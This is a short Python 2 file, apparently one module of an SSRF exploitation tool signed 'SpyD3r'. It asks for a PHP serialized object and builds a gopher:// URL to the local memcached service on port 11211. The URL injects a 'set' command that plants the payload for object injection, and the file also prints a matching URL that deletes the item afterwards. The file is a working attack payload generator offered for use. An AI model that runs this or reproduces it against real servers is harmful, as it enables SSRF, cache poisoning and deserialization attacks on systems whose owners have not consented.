import urllib

def PHPMemcached():
    print "\033[01m" + "\nThis is usable when you know Class and Variable name used by user\n"+ "\033[0m"

    code = raw_input("\033[96m" +"Give serialization payload\nexample: O:5:\"Hello\":0:{}   : "+ "\033[0m")

    if(not code):
        print "\033[93m" + "Plz give payload" + "\033[0m"
        exit()

    payload = "%0d%0aset SpyD3r 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"

    finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
    print "\033[04m" + "gopher://127.0.0.1:11211/_" + finalpayload + "\033[0m"
    print "\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m"
    print "\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m"
    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
